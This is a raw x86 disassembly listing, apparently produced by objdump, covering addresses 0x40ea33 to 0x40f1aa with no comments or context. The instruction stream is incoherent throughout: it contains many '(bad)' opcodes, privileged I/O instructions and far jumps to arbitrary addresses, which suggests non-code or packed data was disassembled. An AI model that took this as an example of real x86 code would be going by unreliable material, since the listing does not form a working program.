  40ea33:	cmp    ecx,DWORD PTR [edx-0x7f]
  40ea36:	xchg   esp,eax
  40ea37:	xchg   esp,edx
  40ea39:	xchg   DWORD PTR [esi],eax
  40ea3b:	shl    ah,cl
  40ea3d:	std    
  40ea3e:	pop    eax
  40ea3f:	cmc    
  40ea40:	int3   
  40ea41:	mov    ah,0xd2
  40ea43:	and    BYTE PTR cs:[edi-0x5a],ah
  40ea47:	outs   dx,BYTE PTR ds:[esi]
  40ea48:	hlt    
  40ea49:	and    al,0x79
  40ea4b:	popa   
  40ea4c:	cmp    bl,BYTE PTR [edi-0xd]
  40ea4f:	ficomp DWORD PTR [ebx+0x24642c24]
  40ea55:	pop    esi
  40ea56:	pop    esi
  40ea57:	adc    BYTE PTR [ebx+eiz*8-0x4e],0xd1
  40ea5c:	and    eax,0xf22d7f35
  40ea61:	push   ebp
  40ea62:	(bad)  
  40ea63:	or     DWORD PTR [eax-0x2a],ebx
  40ea66:	cmp    ecx,DWORD PTR [eax+0x255812cf]
  40ea6c:	jae    0x40ea76
  40ea6e:	mov    edx,DWORD PTR [ebx]
  40ea70:	in     eax,0x48
  40ea72:	popf   
  40ea73:	push   0x8be343a9
  40ea78:	es mov ch,0xcd
  40ea7b:	pop    ss
  40ea7c:	push   ebx
  40ea7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea7e:	adc    al,BYTE PTR [eax-0x45]
  40ea81:	pop    esp
  40ea82:	leave  
  40ea83:	cmp    eax,0xdbe2aeb8
  40ea88:	ror    DWORD PTR [ecx],0xb8
  40ea8b:	mov    edi,0x9923563
  40ea90:	test   DWORD PTR [edi-0x1ad374e6],0x1119a417
  40ea9a:	aaa    
  40ea9b:	sub    bl,al
  40ea9d:	pop    ecx
  40ea9e:	adc    al,0x31
  40eaa0:	jle    0x40ea48
  40eaa2:	xrelease xchg DWORD PTR [ecx],ecx
  40eaa5:	mov    DWORD PTR [eax],edx
  40eaa7:	jno    0x40ea8d
  40eaa9:	test   BYTE PTR [edi],0x5
  40eaac:	or     al,BYTE PTR [eax+0x69]
  40eaaf:	and    cl,dl
  40eab1:	cs add edx,DWORD PTR es:[edi-0x50]
  40eab6:	xchg   BYTE PTR [edi+0x5b8b1881],al
  40eabc:	pop    edi
  40eabd:	or     BYTE PTR [esi-0x3978d904],dl
  40eac3:	adc    dl,bh
  40eac5:	loopne 0x40ea52
  40eac7:	mov    edx,ebp
  40eac9:	dec    esi
  40eaca:	mov    ecx,0xf58c94e5
  40eacf:	or     al,0x96
  40ead1:	arpl   cx,di
  40ead3:	fidiv  WORD PTR [ecx-0x3f918083]
  40ead9:	popa   
  40eada:	pop    ecx
  40eadb:	push   edi
  40eadc:	outs   dx,BYTE PTR ds:[esi]
  40eadd:	cwde   
  40eade:	mov    ah,0x96
  40eae0:	lods   al,BYTE PTR ds:[esi]
  40eae1:	xor    eax,ecx
  40eae3:	pop    ss
  40eae4:	sbb    esp,esi
  40eae6:	cmp    ebx,edx
  40eae8:	imul   edx,eax,0xffffffaf
  40eaeb:	popa   
  40eaec:	sub    esi,eax
  40eaee:	call   0x4b71a84e
  40eaf3:	adc    DWORD PTR [esi],ebp
  40eaf5:	iret   
  40eaf6:	sbb    BYTE PTR [ebx+0x599896fa],ah
  40eafc:	push   es
  40eafd:	pop    esp
  40eafe:	mov    dh,0xc7
  40eb00:	add    DWORD PTR [edi+0xde6a02a],0xffffff98
  40eb07:	or     ecx,0x1e
  40eb0a:	cmp    ch,dh
  40eb0c:	pop    ebx
  40eb0d:	fisub  WORD PTR [ecx-0x7f89034f]
  40eb14:	push   ds
  40eb15:	bound  edx,QWORD PTR [edx]
  40eb17:	inc    esp
  40eb18:	inc    edi
  40eb19:	aas    
  40eb1a:	mov    edx,0x6bf81a63
  40eb1f:	sbb    BYTE PTR [ebx-0x4ae5d9e5],al
  40eb25:	repz pop DWORD PTR [ebx+0x4a]
  40eb29:	out    0x4,eax
  40eb2b:	mov    bl,0x17
  40eb2d:	xor    DWORD PTR [eax+0x35cf7b0c],ebp
  40eb33:	adc    bh,BYTE PTR [ebx+0xc]
  40eb36:	js     0x40eac8
  40eb38:	and    BYTE PTR es:[ebx+ebx*4-0x695d977a],dh
  40eb40:	fnstenv [eax+0x54f15c91]
  40eb46:	inc    esi
  40eb47:	mov    edi,0x39c5aa75
  40eb4c:	pop    di
  40eb4e:	xchg   ebp,eax
  40eb4f:	les    ecx,FWORD PTR [ecx]
  40eb51:	stos   BYTE PTR es:[edi],al
  40eb52:	add    ebp,DWORD PTR [ebx+0x42523ab9]
  40eb58:	outs   dx,BYTE PTR ds:[esi]
  40eb59:	lea    ebp,[eax-0x42479e18]
  40eb5f:	pop    edi
  40eb60:	lods   al,BYTE PTR ds:[esi]
  40eb61:	lock jae 0x40eb8b
  40eb64:	lods   al,BYTE PTR ds:[esi]
  40eb65:	div    BYTE PTR [ecx]
  40eb67:	mov    bl,BYTE PTR [eax-0x3486b821]
  40eb6d:	and    ebx,DWORD PTR [ebp+0x3a587409]
  40eb73:	fldenv [esi]
  40eb75:	pop    ecx
  40eb76:	mov    esi,0x9419aee1
  40eb7b:	popf   
  40eb7c:	ret    0x8884
  40eb7f:	xchg   ecx,eax
  40eb80:	sub    eax,0xa3a841d
  40eb85:	sar    DWORD PTR [eax+0x7],cl
  40eb88:	cmp    dl,dh
  40eb8a:	mov    eax,ds:0xcca25a4
  40eb8f:	xor    al,0xdc
  40eb91:	les    edi,FWORD PTR ds:0x6018bbe9
  40eb97:	xchg   edi,eax
  40eb98:	xor    eax,0x4507d352
  40eb9d:	jno    0x40ec16
  40eb9f:	add    DWORD PTR [ecx+0x67],edx
  40eba2:	or     eax,0x4be1cd49
  40eba7:	or     eax,0xa3a7754f
  40ebac:	ss jno 0x40ebb4
  40ebaf:	mov    al,0x98
  40ebb1:	cmp    al,0xe
  40ebb3:	cmp    al,0xfc
  40ebb5:	cs aaa 
  40ebb7:	nop
  40ebb8:	xchg   edx,eax
  40ebb9:	hlt    
  40ebba:	cmp    dh,BYTE PTR [eax-0x39]
  40ebbd:	(bad)  
  40ebbe:	loope  0x40eb6b
  40ebc0:	inc    esp
  40ebc1:	cmp    esi,DWORD PTR [ecx]
  40ebc3:	dec    eax
  40ebc4:	sub    al,0xda
  40ebc6:	lea    eax,[ebx]
  40ebc8:	pop    ebx
  40ebc9:	dec    esp
  40ebca:	idiv   ebx
  40ebcc:	addr16 mov ecx,0x89a9349f
  40ebd2:	(bad)  
  40ebd3:	(bad)  
  40ebd5:	js     0x40ec00
  40ebd7:	mov    ah,0x13
  40ebd9:	pop    esi
  40ebda:	jmp    0x29cf:0x120cedcb
  40ebe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe2:	je     0x40eb82
  40ebe4:	sub    edx,DWORD PTR [edx-0x1be72a8e]
  40ebea:	rcl    BYTE PTR [edx-0x2],0xff
  40ebee:	aam    0xb
  40ebf0:	and    esp,eax
  40ebf2:	mov    al,ds:0x308c385f
  40ebf7:	add    al,0xeb
  40ebf9:	jmp    0xe02d6739
  40ebfe:	(bad)  
  40ebff:	cmp    cl,BYTE PTR [ecx+0x6ea25e69]
  40ec05:	jo     0x40ebf6
  40ec07:	adc    BYTE PTR [esp+0xd],dh
  40ec0b:	fwait
  40ec0c:	xchg   BYTE PTR [edi+0x54243180],bh
  40ec12:	or     eax,0x4fc431c
  40ec17:	clc    
  40ec18:	sbb    DWORD PTR [esp+edx*1+0x6a],esp
  40ec1c:	shl    dh,0x9c
  40ec1f:	arpl   WORD PTR ds:0xd30c9e8b,dx
  40ec25:	je     0x40ec6b
  40ec27:	out    0xce,al
  40ec29:	adc    DWORD PTR [ebx-0x2ec6a421],eax
  40ec2f:	cs aam 0x30
  40ec32:	xor    eax,0xac763b7d
  40ec37:	xchg   esp,eax
  40ec38:	idiv   DWORD PTR [ebx+0x18f9f654]
  40ec3e:	or     eax,0xddfc27b3
  40ec43:	retf   0xd68b
  40ec46:	pushf  
  40ec47:	jno    0x40eca9
  40ec49:	lahf   
  40ec4a:	cmp    cl,0x55
  40ec4d:	cmc    
  40ec4e:	push   es
  40ec4f:	xchg   ebx,eax
  40ec50:	dec    edi
  40ec51:	test   eax,0x27a3832f
  40ec56:	mov    dh,0x19
  40ec58:	stos   DWORD PTR es:[edi],eax
  40ec59:	fisttp WORD PTR [esi-0x49c25518]
  40ec5f:	xchg   edi,eax
  40ec60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec61:	fsubp  st(3),st
  40ec63:	nop
  40ec64:	push   esi
  40ec65:	not    dh
  40ec67:	int3   
  40ec68:	push   cs
  40ec69:	xor    DWORD PTR [ebp+0x58e5609f],esp
  40ec6f:	daa    
  40ec70:	sbb    bh,BYTE PTR [esi]
  40ec72:	sub    cl,BYTE PTR [ebx]
  40ec74:	xlat   BYTE PTR ds:[ebx]
  40ec75:	xor    al,0x63
  40ec77:	push   ebp
  40ec78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec79:	inc    edi
  40ec7a:	pusha  
  40ec7b:	dec    esp
  40ec7c:	sbb    BYTE PTR [edi-0x56],ch
  40ec7f:	lods   eax,DWORD PTR ds:[esi]
  40ec80:	mov    ch,0xa1
  40ec82:	arpl   WORD PTR [eax],bx
  40ec84:	inc    edx
  40ec85:	cmp    al,0xbb
  40ec87:	adc    al,0x51
  40ec89:	add    ah,BYTE PTR [ecx]
  40ec8b:	(bad)  
  40ec8d:	gs in  al,0x9f
  40ec90:	pop    edi
  40ec91:	sub    al,0xc1
  40ec93:	or     eax,0x4bfcee2b
  40ec98:	sub    edi,DWORD PTR [ebx+0x782c698a]
  40ec9e:	or     al,0x82
  40eca0:	ja     0x40ecb2
  40eca2:	nop
  40eca3:	pop    ds
  40eca4:	clc    
  40eca5:	adc    eax,0x9890e962
  40ecaa:	jne    0x40ec38
  40ecac:	idiv   BYTE PTR [esi]
  40ecae:	loope  0x40ec53
  40ecb0:	xor    BYTE PTR [esi+0x190b7cc4],bh
  40ecb6:	fisub  WORD PTR [ebx+0x5f0654bb]
  40ecbc:	jns    0x40ecdc
  40ecbe:	stc    
  40ecbf:	sar    DWORD PTR [esp+ebp*8-0x5f6968b9],0xcb
  40ecc7:	mov    ah,BYTE PTR [ebp+0x28]
  40ecca:	pop    esi
  40eccb:	cwde   
  40eccc:	(bad)
  40eccf:	daa    
  40ecd0:	mov    esp,0xbc23bc7d
  40ecd5:	rcl    esi,1
  40ecd7:	mov    ds:0x390ebed4,eax
  40ecdc:	jno    0x40ecf4
  40ecde:	fdiv   DWORD PTR [esi]
  40ece0:	pop    es
  40ece1:	jle    0x40ecd8
  40ece3:	iret   
  40ece4:	mov    ah,0xde
  40ece6:	xor    eax,0xf650e120
  40eceb:	ins    DWORD PTR es:[edi],dx
  40ecec:	ret    
  40eced:	out    0x54,eax
  40ecef:	adc    DWORD PTR [ecx-0x61],ebx
  40ecf2:	xor    BYTE PTR [eax],dl
  40ecf4:	mov    ds:0x56c2c508,eax
  40ecf9:	sub    dl,dl
  40ecfb:	out    dx,al
  40ecfc:	rcl    ecx,cl
  40ecfe:	(bad)  
  40ecff:	or     DWORD PTR [esi],0x64
  40ed02:	pop    edx
  40ed03:	or     WORD PTR [eax+0x2],si
  40ed07:	xchg   edx,eax
  40ed08:	jne    0x40ed82
  40ed0a:	push   esi
  40ed0b:	aaa    
  40ed0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed0d:	push   ebp
  40ed0e:	mul    bl
  40ed10:	add    bl,dl
  40ed12:	ins    DWORD PTR es:[edi],dx
  40ed13:	test   ebp,esp
  40ed15:	jns    0x40ecd5
  40ed17:	clc    
  40ed18:	jp     0x40ed41
  40ed1a:	sbb    eax,0xc294706b
  40ed1f:	pop    esp
  40ed20:	xchg   ecx,eax
  40ed21:	ds mov edx,0xe9adf058
  40ed27:	std    
  40ed28:	mov    eax,ebp
  40ed2a:	aas    
  40ed2b:	pop    edx
  40ed2c:	sbb    ch,0x19
  40ed2f:	or     cl,BYTE PTR [ebx]
  40ed31:	xor    DWORD PTR [edi+0x71],ecx
  40ed34:	mov    gs,ecx
  40ed36:	sbb    ah,BYTE PTR [edi+0x4faf67e6]
  40ed3c:	bound  esi,QWORD PTR [esi]
  40ed3e:	sub    ah,BYTE PTR [eax+0x62]
  40ed41:	xor    al,BYTE PTR [ebp-0x2b092645]
  40ed47:	imul   ecx,DWORD PTR [esi+0x54],0x973079df
  40ed4e:	lock fsubr QWORD PTR [eax+0x0]
  40ed52:	pop    edi
  40ed53:	int    0x96
  40ed55:	xlat   BYTE PTR ds:[ebx]
  40ed56:	sub    DWORD PTR ds:0xd2c1dcde,edi
  40ed5c:	jmp    0xbedf:0xa547d70e
  40ed63:	mov    ch,al
  40ed65:	pop    ds
  40ed66:	mov    eax,ds:0x615598a9
  40ed6b:	or     eax,0x778deaa4
  40ed70:	ins    BYTE PTR es:[edi],dx
  40ed71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed72:	xor    edx,esi
  40ed74:	jmp    0xf5ca:0xea64b1e
  40ed7b:	add    al,0xc3
  40ed7d:	jmp    DWORD PTR ds:0x6bc6cc6c
  40ed83:	adc    DWORD PTR [ebp+0x53536fe3],edi
  40ed89:	push   ss
  40ed8a:	loope  0x40edd5
  40ed8c:	push   ds
  40ed8d:	mov    al,0xa1
  40ed8f:	bound  ecx,QWORD PTR [eax+0x19c3e9e3]
  40ed95:	scas   eax,DWORD PTR es:[edi]
  40ed96:	xchg   DWORD PTR [eax-0x3e4d93],eax
  40ed9c:	push   0x41
  40ed9e:	mov    dh,BYTE PTR ss:[eax+0x6f]
  40eda2:	ja     0x40ee21
  40eda4:	inc    esp
  40eda5:	push   esp
  40eda6:	or     BYTE PTR [ecx],ch
  40eda8:	jl     0x40ee21
  40edaa:	jp     0x40ed55
  40edac:	(bad)  
  40edad:	cli    
  40edae:	(bad)  
  40edaf:	xchg   esi,eax
  40edb0:	shl    bl,0x96
  40edb3:	mov    fs,edi
  40edb5:	adc    al,0x80
  40edb7:	(bad)  
  40edb8:	(bad)  
  40edb9:	mov    BYTE PTR [edi],0x3a
  40edbc:	out    dx,ax
  40edbe:	adc    eax,esi
  40edc0:	jbe    0x40ed53
  40edc2:	push   ebx
  40edc3:	lock or al,0x89
  40edc6:	in     al,0xbd
  40edc8:	mov    ch,0xa6
  40edca:	aas    
  40edcb:	stc    
  40edcc:	xor    edi,ebp
  40edce:	stos   BYTE PTR es:[edi],al
  40edcf:	add    DWORD PTR ds:0xa182e09a,eax
  40edd5:	mov    dl,BYTE PTR [ecx-0x2a0e9a9]
  40eddb:	lock push edi
  40eddd:	inc    edx
  40edde:	es es out dx,al
  40ede1:	or     BYTE PTR [esi],cl
  40ede3:	pop    es
  40ede4:	mov    bh,0x39
  40ede6:	and    al,0x6d
  40ede8:	ins    BYTE PTR es:[edi],dx
  40ede9:	xchg   edx,eax
  40edea:	std    
  40edeb:	sbb    DWORD PTR [esi+0x243bc83],esi
  40edf1:	retf   0x2acb
  40edf4:	or     BYTE PTR [ecx+0x66],bl
  40edf7:	push   esp
  40edf8:	shl    DWORD PTR [esi],1
  40edfa:	das    
  40edfb:	add    eax,0xa97f0b8
  40ee00:	mul    bh
  40ee02:	and    eax,0x6054c7e0
  40ee07:	je     0x40eda8
  40ee09:	xchg   ebx,eax
  40ee0a:	shr    DWORD PTR [edx-0x27aa3845],1
  40ee10:	sub    DWORD PTR [esi],ebx
  40ee12:	sub    DWORD PTR [ebp+0x5f],0xffffffb6
  40ee16:	pop    es
  40ee17:	in     al,dx
  40ee18:	adc    BYTE PTR [eax+0x6a7e3e12],dl
  40ee1e:	push   edi
  40ee1f:	or     esp,DWORD PTR [esi]
  40ee21:	and    BYTE PTR [ebp-0x56],al
  40ee24:	aaa    
  40ee25:	pop    esi
  40ee26:	loop   0x40ee91
  40ee28:	mov    ecx,0xdfe05d01
  40ee2d:	add    esp,DWORD PTR [edx]
  40ee2f:	dec    ebx
  40ee30:	adc    BYTE PTR [ebx+0x2d610b41],dl
  40ee36:	mov    ds:0xb13688fc,al
  40ee3b:	daa    
  40ee3c:	aad    0x20
  40ee3e:	aad    0xec
  40ee40:	rcr    bh,cl
  40ee42:	fsub   QWORD PTR [ecx+0x7b]
  40ee45:	pop    eax
  40ee46:	int    0xd5
  40ee48:	shl    BYTE PTR [ecx],0x39
  40ee4b:	adc    eax,0xabe568bd
  40ee50:	lea    ebx,[ebp+0xa]
  40ee53:	pop    ss
  40ee54:	mov    edi,0x32fdd415
  40ee59:	leave  
  40ee5a:	jle    0x40ee55
  40ee5c:	cli    
  40ee5d:	outs   dx,BYTE PTR ds:[esi]
  40ee5e:	xor    DWORD PTR [eax-0x1d],ebp
  40ee61:	push   ebx
  40ee62:	pop    ecx
  40ee63:	outs   dx,DWORD PTR ds:[esi]
  40ee64:	pop    ecx
  40ee65:	es xchg ecx,eax
  40ee67:	mov    BYTE PTR [esi-0x1a82506d],cl
  40ee6d:	xchg   BYTE PTR [eax],bh
  40ee6f:	bnd ret 
  40ee71:	lock mov ah,BYTE PTR ds:[ebp+esi*8-0x22ff4c48]
  40ee7a:	aam    0x7
  40ee7c:	(bad)  
  40ee7d:	mov    eax,0xc511283e
  40ee82:	xchg   BYTE PTR [eax],dl
  40ee84:	adc    al,BYTE PTR [edi]
  40ee86:	hlt    
  40ee87:	mov    ebp,0x61bdac66
  40ee8c:	mov    eax,0x1d296dd6
  40ee91:	retf   
  40ee92:	bound  eax,QWORD PTR [ecx+0x1aa0979f]
  40ee98:	jne    0x40ee8a
  40ee9a:	clc    
  40ee9b:	jae    0x40ee99
  40ee9d:	push   edx
  40ee9e:	out    0x1,al
  40eea0:	fist   DWORD PTR [ebp-0x49]
  40eea3:	sbb    al,0xb9
  40eea5:	bound  esi,QWORD PTR [edi]
  40eea7:	scas   al,BYTE PTR es:[edi]
  40eea8:	and    ah,BYTE PTR [eax]
  40eeaa:	sar    edx,0xb7
  40eead:	in     al,0xd4
  40eeaf:	je     0x40eeda
  40eeb1:	inc    edx
  40eeb2:	cmc    
  40eeb3:	inc    edx
  40eeb4:	rcr    BYTE PTR [ebp-0x27],cl
  40eeb7:	push   cs
  40eeb8:	outs   dx,BYTE PTR ds:[esi]
  40eeb9:	sub    al,0x46
  40eebb:	aam    0x5f
  40eebd:	add    al,ah
  40eebf:	push   edi
  40eec0:	(bad)  
  40eec1:	es add eax,esp
  40eec4:	sbb    DWORD PTR [ebp+0x4b148479],ecx
  40eeca:	sub    dh,BYTE PTR [esi+0x397e7511]
  40eed0:	jno    0x40ef02
  40eed2:	mov    ch,0x6
  40eed4:	mov    eax,ds:0xad6f374d
  40eed9:	xor    DWORD PTR [edi],esi
  40eedb:	lea    eax,[ecx+0x35]
  40eede:	retf   0x4ac5
  40eee1:	pop    ds
  40eee2:	clc    
  40eee3:	(bad)  
  40eee4:	cmp    DWORD PTR [edi+edi*8],ebx
  40eee7:	sub    eax,DWORD PTR [edx]
  40eee9:	adc    eax,0x91da7c95
  40eeee:	or     al,0xc4
  40eef0:	mov    cl,0x4f
  40eef2:	mov    ebx,0x5bf5605e
  40eef7:	inc    ebx
  40eef8:	jnp    0x40ee95
  40eefa:	push   esp
  40eefb:	pop    edx
  40eefc:	mov    cl,0x77
  40eefe:	imul   esp,eax,0xc86d3919
  40ef04:	imul   ecx,DWORD PTR [ecx+ebp*2],0x11fe17c0
  40ef0b:	mov    bh,0xbd
  40ef0d:	add    al,0x77
  40ef0f:	pop    ds
  40ef10:	sub    al,BYTE PTR ds:0x9bf04241
  40ef16:	mov    dl,0x62
  40ef18:	gs in  al,dx
  40ef1a:	shl    edx,cl
  40ef1c:	adc    eax,0x76d80040
  40ef21:	lds    ebp,FWORD PTR [ebp-0x5c]
  40ef24:	pushf  
  40ef25:	adc    DWORD PTR [edi-0x79],edx
  40ef28:	cdq    
  40ef29:	sub    ch,ch
  40ef2b:	push   cs
  40ef2c:	sub    al,0x98
  40ef2e:	push   ecx
  40ef2f:	gs mov esi,0x74ee88ea
  40ef35:	pusha  
  40ef36:	add    dl,BYTE PTR [edi-0x9]
  40ef39:	popf   
  40ef3a:	push   ebp
  40ef3b:	cmp    ebx,DWORD PTR [ebx-0x50bc6ac0]
  40ef41:	xor    cl,ch
  40ef43:	mov    bl,0x1a
  40ef45:	fwait
  40ef46:	or     al,0x95
  40ef48:	sbb    eax,0xbe2e1827
  40ef4d:	test   al,0xdc
  40ef4f:	mov    ?,WORD PTR [edx]
  40ef51:	jg     0x40ef41
  40ef53:	ins    DWORD PTR es:[edi],dx
  40ef54:	ficomp WORD PTR [eax-0x2d0c9b28]
  40ef5a:	outs   dx,DWORD PTR ds:[esi]
  40ef5b:	int3   
  40ef5c:	int    0xc6
  40ef5e:	jno    0x40ef27
  40ef60:	xor    eax,0xd767a9d8
  40ef65:	nop
  40ef66:	adc    eax,0x65646f04
  40ef6b:	or     bh,BYTE PTR [eax+0x7b84771b]
  40ef71:	adc    DWORD PTR [edi],ebp
  40ef73:	or     al,0xe7
  40ef75:	push   esi
  40ef76:	int3   
  40ef77:	mov    WORD PTR [ebp-0x2bf3c43b],fs
  40ef7d:	fwait
  40ef7e:	retf   
  40ef7f:	bswap  ebp
  40ef81:	mov    esp,0xf50c90d4
  40ef86:	adc    DWORD PTR [ecx],ebx
  40ef88:	bound  edx,QWORD PTR [esi]
  40ef8a:	clc    
  40ef8b:	in     eax,dx
  40ef8c:	and    DWORD PTR [ebp+0x1e38d364],esi
  40ef92:	sub    BYTE PTR [ebp+edx*1-0x371ec9a1],bl
  40ef99:	jl     0x40efce
  40ef9b:	xchg   ecx,eax
  40ef9c:	mov    al,0xea
  40ef9e:	dec    esi
  40ef9f:	sti    
  40efa0:	jbe    0x40ef25
  40efa2:	rol    BYTE PTR [ebx],0x6d
  40efa5:	test   DWORD PTR [esi+0x162e4f59],edx
  40efab:	pushf  
  40efac:	dec    ebx
  40efad:	sub    dh,BYTE PTR [esp+ebx*8-0x193dad6d]
  40efb4:	jge    0x40ef4b
  40efb6:	sub    BYTE PTR [eax+0x4c86504e],dh
  40efbc:	retf   0xfaa4
  40efbf:	es or  edx,0x9e302fd2
  40efc6:	jb     0x40efa1
  40efc8:	inc    ebx
  40efc9:	mov    eax,ds:0xe446ed36
  40efce:	cli    
  40efcf:	push   cs
  40efd0:	ss pop esp
  40efd2:	sub    eax,0xb09e814a
  40efd7:	jmp    0x40ef7b
  40efd9:	jne    0x40f002
  40efdb:	add    edi,esi
  40efdd:	sub    ebx,esp
  40efdf:	cmp    edi,eax
  40efe1:	adc    eax,edx
  40efe3:	cmp    dl,BYTE PTR [edx-0x6]
  40efe6:	aam    0x45
  40efe8:	imul   edi,DWORD PTR cs:[edx-0x28],0x418ea37f
  40eff0:	stos   DWORD PTR es:[edi],eax
  40eff1:	nop
  40eff2:	fidivr WORD PTR [esi+0x57]
  40eff5:	mov    esp,0xa5f809ae
  40effa:	fs xchg edx,eax
  40effc:	aad    0x55
  40effe:	loop   0x40f04a
  40f000:	retf   0x7fe
  40f003:	sbb    esp,esi
  40f005:	je     0x40ef99
  40f007:	and    DWORD PTR [edi-0x2e],esi
  40f00a:	jmp    0x40f01e
  40f00c:	(bad)  
  40f00d:	sti    
  40f00e:	mov    ds:0xd95c847f,eax
  40f013:	and    edi,DWORD PTR [ebx]
  40f015:	imul   eax,DWORD PTR [eax-0x2d],0x31
  40f019:	pop    ecx
  40f01a:	addr16 or eax,esp
  40f01d:	jle    0x40f00b
  40f01f:	mov    dl,0x68
  40f021:	adc    eax,0x477ea7cd
  40f026:	push   ecx
  40f027:	cmp    DWORD PTR [edi+0x63],esi
  40f02a:	test   bl,bh
  40f02c:	adc    ah,BYTE PTR ds:0x6e3b36d2
  40f032:	ret    
  40f033:	pop    ebp
  40f034:	sbb    BYTE PTR [ecx],bh
  40f036:	jle    0x40f049
  40f038:	pop    ss
  40f039:	add    cl,ch
  40f03b:	jl     0x40f047
  40f03d:	call   0xb578:0xe03a2b5
  40f044:	xor    DWORD PTR [ebp-0xc],ecx
  40f047:	sahf   
  40f048:	mov    ebp,0x52dbf329
  40f04d:	mov    BYTE PTR [ebx],bl
  40f04f:	into   
  40f050:	or     bh,BYTE PTR [ecx+0x35]
  40f053:	cmp    al,0x2f
  40f055:	or     al,0x4d
  40f057:	pop    ss
  40f058:	mov    WORD PTR [esi+0x3a10f315],es
  40f05e:	xor    BYTE PTR [ebx+0x66],dh
  40f061:	stos   BYTE PTR es:[edi],al
  40f062:	xchg   ecx,eax
  40f063:	push   es
  40f064:	mov    esi,DWORD PTR [esi-0x33]
  40f067:	add    ecx,ebx
  40f069:	sahf   
  40f06a:	cmp    edx,DWORD PTR [eax-0x50]
  40f06d:	sub    al,0x96
  40f06f:	out    dx,al
  40f070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f071:	(bad)  
  40f072:	fxch   st(4)
  40f074:	outs   dx,DWORD PTR ds:[esi]
  40f075:	and    DWORD PTR [edi+0x6b],eax
  40f078:	test   BYTE PTR [ebp-0xd2336d0],0x7e
  40f07f:	jae    0x40f0fc
  40f081:	outs   dx,BYTE PTR ds:[esi]
  40f082:	aas    
  40f083:	leave  
  40f084:	sbb    BYTE PTR es:[esp+eax*4],al
  40f088:	arpl   WORD PTR [edi-0x234f722f],ax
  40f08e:	repz repz dec eax
  40f091:	sbb    BYTE PTR [ebx-0x53171640],bl
  40f097:	pop    ds
  40f098:	dec    edi
  40f099:	mov    esp,DWORD PTR [edi-0x34]
  40f09c:	clc    
  40f09d:	push   0x17a0248e
  40f0a2:	sbb    bl,al
  40f0a4:	iret   
  40f0a5:	dec    ecx
  40f0a6:	dec    edi
  40f0a7:	jb     0x40f060
  40f0a9:	pop    edx
  40f0aa:	jge    0x40f03c
  40f0ac:	sbb    eax,0x80b8181c
  40f0b1:	retf   
  40f0b2:	adc    al,0x4f
  40f0b4:	ror    DWORD PTR [edx+0x30f99168],1
  40f0ba:	jns    0x40f047
  40f0bc:	mov    fs,WORD PTR [edx]
  40f0be:	cmp    DWORD PTR [eax+0x2d],ebx
  40f0c1:	xchg   ebx,eax
  40f0c2:	retf   
  40f0c3:	mov    eax,0xb9fcceb6
  40f0c8:	into   
  40f0c9:	call   0xb3a38878
  40f0ce:	je     0x40f0d8
  40f0d0:	sub    BYTE PTR [ecx+0x7410f086],0xe5
  40f0d7:	test   al,0x6f
  40f0d9:	jl     0x40f11c
  40f0db:	outs   dx,DWORD PTR ds:[esi]
  40f0dc:	and    eax,0x156f17fc
  40f0e1:	shr    DWORD PTR [edi],1
  40f0e3:	xchg   edx,eax
  40f0e4:	mov    edi,0xde6ddb9c
  40f0e9:	scas   eax,DWORD PTR es:[edi]
  40f0ea:	loope  0x40f121
  40f0ec:	ds inc ebx
  40f0ee:	dec    ecx
  40f0ef:	mov    eax,ds:0x62bf8d8b
  40f0f4:	push   ebx
  40f0f5:	add    BYTE PTR [eax+0xb6448a1],bl
  40f0fb:	fisttp DWORD PTR [edi-0x7a]
  40f0fe:	pop    ecx
  40f0ff:	pop    edx
  40f100:	scas   eax,DWORD PTR es:[edi]
  40f101:	data16 je 0x40f136
  40f104:	push   es
  40f105:	int    0x16
  40f107:	jle    0x40f10e
  40f109:	out    0x69,eax
  40f10b:	inc    ecx
  40f10c:	in     eax,dx
  40f10d:	and    DWORD PTR [eax+0x64efb8eb],eax
  40f113:	or     dh,BYTE PTR ds:0xe1850dcf
  40f119:	jle    0x40f119
  40f11b:	fisub  DWORD PTR [edx+eax*8+0x20bc9e83]
  40f122:	scas   eax,DWORD PTR es:[edi]
  40f123:	sahf   
  40f124:	push   ebx
  40f125:	rcr    BYTE PTR [eax],0x70
  40f128:	or     eax,0x3a5b9dfd
  40f12d:	and    al,0x1e
  40f12f:	arpl   WORD PTR [eax+0x3c2673cc],bx
  40f135:	mov    al,bl
  40f137:	add    eax,0xfd2ee56e
  40f13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f13d:	out    dx,eax
  40f13e:	add    esp,DWORD PTR [esi-0x520758e]
  40f144:	jnp    0x40f1c0
  40f146:	into   
  40f147:	lds    ebx,FWORD PTR [eax+0x78]
  40f14a:	dec    ebx
  40f14b:	jmp    0x9eed:0xd331c7db
  40f152:	rcl    BYTE PTR [ebx-0x21],1
  40f155:	sbb    edi,ebp
  40f157:	int3   
  40f158:	fld    TBYTE PTR [eax+0x4538da70]
  40f15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f15f:	inc    eax
  40f160:	repnz adc eax,0xf32480f7
  40f166:	mov    eax,0xe0c6284
  40f16b:	mov    eax,0xb3cd2966
  40f170:	push   ebp
  40f171:	sub    bl,BYTE PTR [edx-0x7a]
  40f174:	cmp    DWORD PTR [ecx+0x4b],ebx
  40f177:	and    al,0xd8
  40f179:	xchg   ebx,eax
  40f17a:	add    esi,DWORD PTR [esp]
  40f17d:	mov    ebx,0xa6239f6
  40f182:	(bad)  
  40f183:	jecxz  0x40f1fd
  40f185:	sbb    eax,0xe77c9806
  40f18a:	outs   dx,DWORD PTR ds:[esi]
  40f18b:	jae    0x40f1b9
  40f18d:	sbb    esi,edi
  40f18f:	lea    esp,[ebp-0x6eda9281]
  40f195:	xchg   edx,eax
  40f196:	(bad)  
  40f197:	sbb    dl,BYTE PTR [edi+0x2f049127]
  40f19d:	out    dx,eax
  40f19e:	xor    DWORD PTR [ebp-0x6a],ebp
  40f1a1:	dec    edx
  40f1a2:	jge    0x40f1dc
  40f1a4:	jno    0x40f1ce
  40f1a6:	imul   edx,DWORD PTR [ebx+0x39],0xffffffef
  40f1aa:	dec    esp
